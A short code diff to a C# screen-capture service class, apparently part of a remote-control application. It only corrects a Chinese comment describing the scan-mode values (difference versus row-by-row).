@@ -29,7 +29,7 @@ namespace SiMay.ServiceCore.ApplicationService
     public class ScreenService : ServiceManager, IApplicationService
     {
 
-        private int _bscanmode = 1; //0逐行 1差异
+        private int _bscanmode = 1; //0差异 1逐行
         private bool _hasSystemAuthor = AppConfiguartion.HasSystemAuthority.Equals("true", StringComparison.OrdinalIgnoreCase);
         private ScreenSpy _spy;
         private PacketModelBinder<TcpSocketSaeaSession> _handlerBinder = new PacketModelBinder<TcpSocketSaeaSession>();
